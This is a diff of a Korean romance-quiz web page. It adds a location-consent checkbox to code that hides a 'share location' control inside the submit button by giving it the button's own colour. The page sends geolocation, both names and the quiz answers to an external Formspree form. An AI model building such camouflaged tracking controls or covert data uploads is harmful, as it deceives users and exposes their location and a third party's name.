@@ -2,88 +2,48 @@
 <html lang="ko">
 <head>
   <meta charset="utf-8">
-  <title>짝사랑 성공 확률 테스트 💘</title>
+  <title>짝사랑 성공 확률 테스트 💘 (동의 체크박스 포함)</title>
   <style>
-    body {
-      font-family: 'Arial', sans-serif;
-      background-color: #fff0f5;
-      text-align: center;
-      padding: 40px;
-    }
-    form {
-      background: white;
-      padding: 24px;
-      border-radius: 12px;
-      display: inline-block;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-      max-width: 460px;
-      text-align: left;
-    }
-    h1 { color: #ff69b4; text-align: center; }
-    label { display: block; margin: 10px 0 5px; }
-    .option { display: block; margin-left: 15px; }
-    input[type="text"] {
-      padding: 8px;
-      width: 90%;
-      border-radius: 6px;
-      border: 1px solid #ccc;
-    }
-    .question { margin-top: 20px; }
-    button {
-      margin-top: 25px;
-      padding: 14px 20px;
-      border: none;
-      border-radius: 10px;
-      background: #ff69b4;
-      color: white;
-      font-size: 16px;
-      cursor: pointer;
-      width: 100%;
-      position: relative;
-    }
-    /* 🔥 버튼 안의 작은 텍스트 색상을 버튼과 동일하게 변경 */
-    button span {
-      display: block;
-      font-size: 11px;
-      color: #ff69b4; /* 버튼 색과 동일 */
-      margin-top: 3px;
-      cursor: pointer; /* 클릭 가능하게 보이도록 */
-      user-select: none;
-    }
+    body { font-family: 'Arial', sans-serif; background-color: #fff0f5; text-align:center; padding:28px; }
+    .consent { display:flex; align-items:center; justify-content:center; gap:10px; margin-bottom:12px; }
+    .consent label { font-size:14px; color:#333; }
+    .consent input[type="checkbox"] { width:16px; height:16px; }
 
-    /* span(위치공유) 접근성/탭포커스 스타일 */
-    #shareLocation {
-      outline: none;
-    }
-    #shareLocation:focus {
-      box-shadow: 0 0 0 3px rgba(255,105,180,0.25);
-      border-radius: 6px;
-    }
-
-    #locationStatus {
-      font-size: 11px;
-      color: #999;
-      text-align: center;
-      margin-top: 5px;
-    }
-    #result {
-      margin-top: 25px;
-      font-size: 20px;
-      font-weight: bold;
-      text-align: center;
-    }
+    form { background:white; padding:20px; border-radius:12px; display:inline-block; box-shadow:0 4px 20px rgba(0,0,0,0.08); max-width:520px; text-align:left; }
+    h1 { color:#ff69b4; text-align:center; margin-top:0; }
+    label { display:block; margin:10px 0 5px; }
+    .option { display:block; margin-left:15px; }
+    input[type="text"] { padding:8px; width:90%; border-radius:6px; border:1px solid #ccc; }
+    .question { margin-top:18px; }
+    button { margin-top:20px; padding:12px 16px; border:none; border-radius:10px; background:#ff69b4; color:white; font-size:16px; cursor:pointer; width:100%; position:relative; }
+    button span { display:block; font-size:11px; color:#ff69b4; margin-top:3px; cursor:pointer; user-select:none; }
+    #shareLocation { outline:none; }
+    #shareLocation:focus { box-shadow:0 0 0 3px rgba(255,105,180,0.18); border-radius:6px; }
+    #locationStatus { font-size:13px; color:#444; text-align:center; margin-top:8px; min-height:22px; }
+    #locationDetails { font-size:12px; color:#666; text-align:center; margin-top:6px; white-space:pre-wrap; }
+    #result { margin-top:20px; font-size:18px; font-weight:bold; text-align:center; }
+    .small-btn { display:inline-block; margin-top:8px; padding:6px 10px; border-radius:6px; background:#fff; border:1px solid #ff69b4; color:#ff69b4; cursor:pointer; font-size:13px;}
+    .muted { color:#666; font-size:13px; }
   </style>
 </head>
 <body>
-  <h1>💘 짝사랑 성공 확률 테스트 💘</h1>
+  <div class="consent" role="region" aria-label="개인정보 동의">
+    <input type="checkbox" id="consentCheckbox" aria-describedby="consentDesc">
+    <label for="consentCheckbox">개인정보(위치) 수집에 동의합니다</label>
+  </div>
+  <div id="consentDesc" class="muted" style="text-align:center;margin-bottom:8px;">
+    동의 시에만 위치를 요청하고 전송합니다. (보안/서비스 목적 / 필요 시에만 사용)
+  </div>
 
-  <form id="loveForm">
+  <form id="loveForm" aria-describedby="consentDesc">
+    <h1>💘 짝사랑 성공 확률 테스트 💘</h1>
+
     <label>당신의 이름:</label>
     <input type="text" id="yourName" required>
     <label>짝사랑 상대 이름:</label>
     <input type="text" id="crushName" required>
 
-    <!-- 질문 10개 -->
+    <!-- 질문 1 (나머지 질문 q2~q10은 원본 코드에서 동일하게 복사해서 사용하세요) -->
     <div class="question">
       <label>1️⃣ 상대와 얼마나 자주 대화하나요?</label>
       <label class="option"><input type="radio" name="q1" value="10"> 거의 안 해요</label>
@@ -92,6 +52,7 @@
       <label class="option"><input type="radio" name="q1" value="100"> 매일 대화해요</label>
     </div>
 
+    <!-- q2 ~ q10 (복사) -->
     <div class="question">
       <label>2️⃣ 상대가 나를 볼 때 미소를 짓나요?</label>
       <label class="option"><input type="radio" name="q2" value="10"> 전혀 아니요</label>
@@ -164,96 +125,121 @@
       <label class="option"><input type="radio" name="q10" value="100"> 자주 챙겨줘요</label>
     </div>
 
-    <button type="submit" id="submitBtn">
+    <button type="submit" id="submitBtn" aria-describedby="consentDesc">
       결과 보기
-      <!-- span은 클릭 시 form 제출을 막고 위치 요청을 하도록 JS가 처리합니다 -->
       <span id="shareLocation" role="button" tabindex="0"> 위치 공유하기 </span>
     </button>
-    <p id="locationStatus"></p>
+
+    <div id="locationStatus">위치: <span id="locSummary">위치 정보 없음</span></div>
+    <div id="locationDetails"></div>
+    <div style="text-align:center;">
+      <button type="button" class="small-btn" id="retryBtn">위치 재시도</button>
+    </div>
   </form>
 
   <div id="result"></div>
 
   <script>
-    let userLocation = "위치 정보 없음";
+    let userLocation = null; // null이면 위치 없음
+    const consentCheckbox = document.getElementById('consentCheckbox');
+    const locSummary = document.getElementById('locSummary');
+    const locDetails = document.getElementById('locationDetails');
+    const shareSpan = document.getElementById('shareLocation');
+    const retryBtn = document.getElementById('retryBtn');
     const formspreeEndpoint = "https://formspree.io/f/xanegwav";
 
-    // 위치 요청 함수: sendImmediately가 true면 위치 획득 후 서버로 바로 전송
+    function updateStatusText(text) {
+      locSummary.innerText = text;
+    }
+    function updateDetails(text) {
+      locDetails.innerText = text;
+    }
+
+    // 위치 요청 함수 — consent 체크 여부를 내부에서 확인
     function requestLocation(sendImmediately = false) {
-      if (!navigator.geolocation) {
-        document.getElementById("locationStatus").innerText = "❌ 이 브라우저는 위치 정보를 지원하지 않습니다.";
+      if (!consentCheckbox.checked) {
+        updateStatusText('위치 수집에 동의해야 합니다.');
+        updateDetails('상단의 체크박스를 눌러 개인정보 수집에 동의한 후 시도하세요.');
         return;
       }
 
-      document.getElementById("locationStatus").innerText = "위치 요청 중...";
+      if (!navigator.geolocation) {
+        updateStatusText('이 브라우저는 위치 정보를 지원하지 않습니다.');
+        updateDetails('HTTPS 또는 localhost 환경에서 테스트하세요.');
+        return;
+      }
+
+      updateStatusText('위치 요청 중...');
+      updateDetails('브라우저 팝업에서 위치 사용을 허용해주세요.');
 
       navigator.geolocation.getCurrentPosition(
         (pos) => {
-          userLocation = `위도: ${pos.coords.latitude}, 경도: ${pos.coords.longitude}`;
-          document.getElementById("locationStatus").innerText = "✅ 위치 공유 완료";
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          const acc = pos.coords.accuracy;
+          userLocation = { lat, lon, acc, timestamp: new Date(pos.timestamp).toISOString() };
+
+          updateStatusText('✅ 위치 공유 완료');
+          updateDetails(`위도: ${lat}\n경도: ${lon}\n정확도: ${acc}m\n타임스탬프: ${userLocation.timestamp}`);
 
           if (sendImmediately) {
-            // 서버로 위치 정보 전송 (예: formspree). 필요하면 이름도 같이 보냅니다.
-            const yourName = document.getElementById("yourName").value.trim();
-            const crushName = document.getElementById("crushName").value.trim();
-
+            // 서버로 전송 (옵션) — 오직 동의 상태인 경우만 전송
             fetch(formspreeEndpoint, {
               method: "POST",
               headers: { "Accept": "application/json", "Content-Type": "application/json" },
               body: JSON.stringify({
                 action: "location_share",
-                yourName: yourName || null,
-                crushName: crushName || null,
                 location: userLocation,
                 timestamp: new Date().toISOString()
               })
-            }).catch((err) => {
-              // 전송 실패 시에도 사용자에게는 위치가 획득되었음을 알린다.
-              console.warn("위치 전송 실패:", err);
-            });
+            }).catch(err => console.warn('위치 전송 실패:', err));
           }
         },
         (err) => {
-          console.error(err);
+          console.error('위치 에러', err);
           if (err.code === 1) {
-            document.getElementById("locationStatus").innerText = "❌ 위치 사용 권한이 차단되었습니다.";
+            updateStatusText('❌ 위치 권한이 거부되었습니다.');
+            updateDetails('브라우저 주소창 → 사이트 설정 → 위치 허용으로 변경해 주세요.');
           } else if (err.code === 2) {
-            document.getElementById("locationStatus").innerText = "❌ 위치를 가져올 수 없습니다.";
+            updateStatusText('❌ 위치를 가져올 수 없습니다.');
+            updateDetails('기기 위치 서비스가 꺼져있거나 신호가 약합니다.');
+          } else if (err.code === 3) {
+            updateStatusText('❌ 위치 요청 시간 초과');
+            updateDetails('다시 시도해보세요.');
           } else {
-            document.getElementById("locationStatus").innerText = "❌ 위치 요청 실패";
+            updateStatusText('❌ 위치 요청 실패');
+            updateDetails('콘솔 로그를 확인하세요.');
           }
         },
-        {
-          enableHighAccuracy: false,
-          timeout: 10000,
-          maximumAge: 0
-        }
+        { enableHighAccuracy: false, timeout: 12000, maximumAge: 0 }
       );
     }
 
-    // span 클릭 -> 위치 요청 (form 제출은 막음)
-    const shareSpan = document.getElementById("shareLocation");
-    shareSpan.addEventListener("click", function(e) {
-      // span이 submit 버튼 내부에 있으므로 클릭 이벤트가 폼 제출로 이어지지 않게 막음
-      e.stopPropagation();
+    // 작은 텍스트(위치 공유) 클릭 시
+    shareSpan.addEventListener('click', function(e) {
       e.preventDefault();
-      requestLocation(true); // true => 획득 즉시 서버로 전송
+      e.stopPropagation();
+      requestLocation(true);
     });
-
-    // 키보드 접근성: Enter/Space 로도 작동
-    shareSpan.addEventListener("keydown", function(e) {
-      if (e.key === "Enter" || e.key === " ") {
+    // 키보드 접근성
+    shareSpan.addEventListener('keydown', function(e) {
+      if (e.key === 'Enter' || e.key === ' ') {
         e.preventDefault();
         requestLocation(true);
       }
     });
 
-    // 제출 시에는 위치 요청을 자동으로 하지 않음(사용자가 직접 공유해야 함)
-    document.getElementById("loveForm").addEventListener("submit", function(e) {
+    // 재시도 버튼(동의 확인 포함)
+    retryBtn.addEventListener('click', function() {
+      requestLocation(false);
+    });
+
+    // 폼 제출 — 동의가 없으면 위치는 포함하지 않음
+    document.getElementById('loveForm').addEventListener('submit', function(e) {
       e.preventDefault();
-      const yourName = document.getElementById("yourName").value.trim();
-      const crushName = document.getElementById("crushName").value.trim();
-      const resultBox = document.getElementById("result");
+      const yourName = document.getElementById('yourName').value.trim();
+      const crushName = document.getElementById('crushName').value.trim();
+      const resultBox = document.getElementById('result');
 
       if (!yourName || !crushName) {
         resultBox.innerText = "⚠️ 이름을 모두 입력해주세요!";
@@ -292,15 +278,24 @@
         <span style="font-size:24px;color:#ff69b4;">${percent}%</span><br><br>${message}
       `;
 
-      // 결과 전송 (기존 동작 유지) — 위치는 사용자가 별도로 공유해야 전송됩니다.
+      // 서버 전송: 동의 여부에 따라 location 포함/미포함
+      const payload = { yourName, crushName, percent, message, answers };
+      if (consentCheckbox.checked && userLocation) {
+        payload.location = userLocation;
+      } else {
+        payload.location = null; // 또는 아예 필드 제거 가능
+      }
+
       fetch(formspreeEndpoint, {
         method: "POST",
         headers: { "Accept": "application/json", "Content-Type": "application/json" },
-        body: JSON.stringify({ yourName, crushName, percent, message, answers, location: userLocation })
-      }).catch((err) => {
-        console.warn("결과 전송 실패:", err);
-      });
+        body: JSON.stringify(payload)
+      }).catch((err) => console.warn("결과 전송 실패:", err));
     });
+
+    // 초기 표시
+    updateStatusText('위치 정보 없음');
+    updateDetails('상단의 체크박스를 통해 위치 수집에 동의한 뒤 "위치 공유하기"를 누르세요.');
   </script>
 </body>
 </html>
